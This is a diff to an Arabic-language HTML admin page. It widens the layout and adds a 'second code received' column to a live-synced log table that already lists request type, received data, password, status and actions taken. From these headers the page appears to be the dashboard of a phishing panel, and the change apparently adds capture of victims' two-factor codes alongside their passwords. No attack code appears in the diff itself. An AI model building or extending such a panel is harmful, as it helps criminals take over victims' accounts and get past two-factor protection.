@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         body { font-family: 'Cairo', sans-serif; background-color: #f4f7f6; margin: 0; padding: 20px; }
-        .container { max-width: 1300px; margin: 0 auto; }
+        .container { max-width: 1350px; margin: 0 auto; }
         h2 { color: #14805e; border-bottom: 2px solid #14805e; padding-bottom: 10px; }
         .table-container { background: #fff; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); overflow-x: auto; margin-top: 20px; }
         table { width: 100%; border-collapse: collapse; text-align: right; }
@@ -58,12 +58,13 @@
                         <th>نوع الطلب</th>
                         <th>البيانات المستلمة</th>
                         <th>كلمة المرور</th>
+                        <th style="text-align: center; background-color: #2c3e50;">الكود الثاني المستلم</th>
                         <th>الحالة</th>
                         <th>الإجراءات المتخذة</th>
                     </tr>
                 </thead>
                 <tbody id="logsTableBody">
-                    <tr><td colspan="5" style="text-align:center;">جاري تحميل البيانات والمزامنة اللحظية...</td></tr>
+                    <tr><td colspan="6" style="text-align:center;">جاري تحميل البيانات والمزامنة اللحظية...</td></tr>
                 </tbody>
             </table>
         </div>
@@ -92,3 +93,4 @@
     <script type="module" src="admin.js"></script>
 </body>
 </html>
+
